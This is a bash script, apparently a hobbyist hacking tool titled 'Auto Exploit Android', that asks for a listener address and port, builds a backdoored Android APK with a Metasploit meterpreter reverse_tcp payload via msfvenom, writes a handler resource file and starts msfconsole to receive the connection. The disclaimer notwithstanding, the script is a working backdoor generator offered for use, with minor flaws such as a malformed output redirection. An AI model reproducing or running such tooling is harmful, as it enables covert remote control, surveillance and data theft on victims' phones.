#!/bin/bash
# Coded by EVO , all rights reserved 
# I'm not responsible of the bad uses that people can give to this tool
clear
New_backdoor() {
	echo " Input the LHOST : "
	read lhost
	echo " Input the LPORT :"
	read lport
	echo " Input the name of the backdoor "
	echo " *remember it must end on .apk*"
	read Backdoor_name
	echo " Creating backdoor...."
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport > R $Backdoor_name
	service postgresql start
	echo "use exploit/multi/handler" >> listener.rc
	echo "set payload android/meterpreter/reverse_tcp" >> listener.rc
	echo "set lhost $lhost" >> listener.rc
	echo "set lport $lport " >> listener.rc
	echo "exploit" >> listener.rc
	msfconsole -r ~/listener.rc 
}

echo "	 _______          _________ _______             _______  _        _______ __________________"
echo "	(  ___  )|\     /|\__   __/(  ___  )  |\     /|(  ____ )( \      (  ___  )\__   __/\__   __/"
echo "	| (   ) || )   ( |   ) (   | (   ) |  ( \   / )| (    )|| (      | (   ) |   ) (      ) (   "
echo "	| (___) || |   | |   | |   | |   | |   \ (_) / | (____)|| |      | |   | |   | |      | |   "
echo "	|  ___  || |   | |   | |   | |   | |    ) _ (  |  _____)| |      | |   | |   | |      | |   "
echo "	| (   ) || |   | |   | |   | |   | |   / ( ) \ | (      | |      | |   | |   | |      | |   "
echo "	| )   ( || (___) |   | |   | (___) |  ( /   \ )| )      | (____/\| (___) |___) (___   | |   "
echo "	|/     \|(_______)   )_(   (_______)  |/     \||/       (_______/(_______)\_______/   )_(   "
echo "                                                                                            "
echo "	 _______  _        ______   _______  _______ _________ ______                               "
echo "	(  ___  )( (    /|(  __  \ (  ____ )(  ___  )\__   __/(  __  \                              "
echo "	| (   ) ||  \  ( || (  \  )| (    )|| (   ) |   ) (   | (  \  )                             "
echo "	| (___) ||   \ | || |   ) || (____)|| |   | |   | |   | |   ) |                             "
echo "	|  ___  || (\ \) || |   | ||     __)| |   | |   | |   | |   | |                             "
echo "	| (   ) || | \   || |   ) || (\ (   | |   | |   | |   | |   ) |                             "
echo "	| )   ( || )  \  || (__/  )| ) \ \__| (___) |___) (___| (__/  )                             "
echo "	|/     \||/    )_)(______/ |/   \__/(_______)\_______/(______/                              "
                                                                 




echo " Tested on 8.x.x"
echo " First of all,  remember YOU and ONLY YOU are the respobsible of your acts"
echo "____________________________________________________________________________________________"
echo " Do you wanna create the backdoor for android?"
echo " [ y / n ] "
read ch

if [ "$ch" == "y" ]; then
	New_backdoor
elif [ "$ch" == "n" ]; then
	echo "Try with 'more' to see more options"
else 
	echo " Your input is not what i purposed to u... "

fi

